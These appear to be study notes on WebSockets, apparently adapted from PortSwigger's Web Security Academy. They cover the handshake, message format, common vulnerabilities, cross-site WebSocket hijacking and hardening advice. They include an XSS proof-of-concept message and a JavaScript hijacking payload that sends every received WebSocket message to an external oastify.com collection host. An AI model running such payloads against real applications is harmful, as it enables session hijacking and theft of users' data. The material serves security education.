# What are WebSockets?
WebSockets are **bi-directional, full duplex communications** protocol initiated over HTTP. They are commonly used in web applications **for streaming data and other asynchronous traffic.**

We will see the difference between HTTP and WebSockets, and how the WebSocket connections are stablished and how the WebSockets messages look like.

# What is the difference between HTTP and WebSockets?
In HTTP, the client **sends a request and the server sends a response for that request.**
Typically, the response occurs immediately, and the transaction is complete, even if the network connection is open.

WebSocket connections are initiated over HTTP and are typically **long-lived**, and messages can be **sent in either direction (not client-server as the typical HTTP connection) and are not transactional in nature**. This means that the connection will stay open and idle until either the client or server is ready to send a message.

WebSockets are particularly useful in situations where low-latency or server-initiated messages are required, such as real-time feeds of financial data.
Summary: Dual side communications and no request-response flow, but a continuous flow of messages.

# How are WebSocket connections established?
WebSocket connections are normally created using client-side JavaScript like the following:
`var ws = new WebSocket("wss://normal-website.com/chat");`
## Note
The `wss` protocol establishes a WebSocket over an encrypted TLS connection, while the `ws` protocol uses an unencrypted connection.

To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:
`GET /chat HTTP/1.1 Host: normal-website.com Sec-WebSocket-Version: 13 Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== Connection: keep-alive, Upgrade Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 Upgrade: websocket`

If the server accepts the connection, it returns a WebSocket handshake response like the following:
`HTTP/1.1 101 Switching Protocols Connection: Upgrade Upgrade: websocket Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=`

At this point, the network connection remains open and can be used to send WebSocket messages in either direction.

## Note
Several features of the WebSocket handshake messages are worth noting:
- The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.
- The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use. This is typically `13`.
- The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
- The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the `Sec-WebSocket-Key` request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.

# What do WebSocket messages look like?
Once a WebSocket connection has been established, messages can be sent asynchronously in either direction by the client or server.

A simple message could be sent from the browser using client-side JavaScript like the following:
`ws.send("Peter Wiener");`

In principle, WebSocket messages can contain **any content or data format**. In modern applications, it is common **for JSON to be used to send structured data within WebSocket messages.**

For example, a chat-bot application using WebSockets might send a message like the following:
`{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}`

# WebSockets security vulnerabilities

In principle, practically any web security vulnerability might arise in relation to WebSockets:
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as [SQL injection](https://portswigger.net/web-security/sql-injection) or XML external entity injection.
- Some blind vulnerabilities reached via WebSockets might only be detectable using [out-of-band (OAST) techniques](https://portswigger.net/blog/oast-out-of-band-application-security-testing).
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to [XSS](https://portswigger.net/web-security/cross-site-scripting) or other client-side vulnerabilities.

## Manipulating WebSocket messages to exploit vulnerabilities
The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by [tampering with the contents of WebSocket messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages).

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:
`{"message":"Hello Carlos"}`

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:
`<td>Hello Carlos</td>`

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:
`{"message":"<img src=1 onerror='alert(1)'>"}`

We can see this vulnerability in the lab: [websockets_xss](labs/websockets_xss.md)

## Manipulating the WebSocket handshake to exploit vulnerabilities
Some WebSockets vulnerabilities can only be found and exploited by [manipulating the WebSocket handshake](https://portswigger.net/web-security/websockets#manipulating-websocket-connections). These vulnerabilities tend to involve design flaws, such as:
- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.


# Cross-site WebSocket hijacking
In this section, we'll explain cross-site WebSocket hijacking (CSWSH), describe the impact of a compromise, and spell out how to perform a cross-site WebSocket hijacking attack.
## What is cross-site WebSocket hijacking?
Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a [cross-site request forgery](https://portswigger.net/web-security/csrf) (CSRF) vulnerability on a [WebSocket handshake](https://portswigger.net/web-security/websockets/what-are-websockets#how-are-websocket-connections-established). It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

## What is the impact of cross-site WebSocket hijacking?

A successful cross-site WebSocket hijacking attack will often enable an attacker to:
- **Perform unauthorized actions masquerading as the victim user.** As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.
- **Retrieve sensitive data that the user can access.** Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

## Performing a cross-site WebSocket hijacking attack
Since a cross-site WebSocket hijacking attack is essentially a [CSRF vulnerability](https://portswigger.net/web-security/csrf) on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the [normal conditions for CSRF attacks](https://portswigger.net/web-security/csrf#how-does-csrf-work), you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:
`GET /chat HTTP/1.1 Host: normal-website.com Sec-WebSocket-Version: 13 Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== Connection: keep-alive, Upgrade Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 Upgrade: websocket`

### Note
The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.

If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using [WebSockets](https://portswigger.net/web-security/websockets). The attack might involve:
- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
- Sending WebSocket messages to retrieve sensitive data.
- Sometimes, just waiting for incoming messages to arrive containing sensitive data.

An example of this attacks is to create a WebSocket connection using XSS for example, and for each message sent in the connection, exfiltrate the data in DNS requests. A payload that does that is the following:
```html
<script>
    var ws = new WebSocket('wss://0a4e009304fbf86f843a63ad00bb0055.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://3x1i317dm1sdvjx9uqsbfihs1j7av0jp.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
# How to secure a WebSocket connection
To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:
- Use the `wss://` protocol (WebSockets over TLS).
- Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
- Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
- Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting).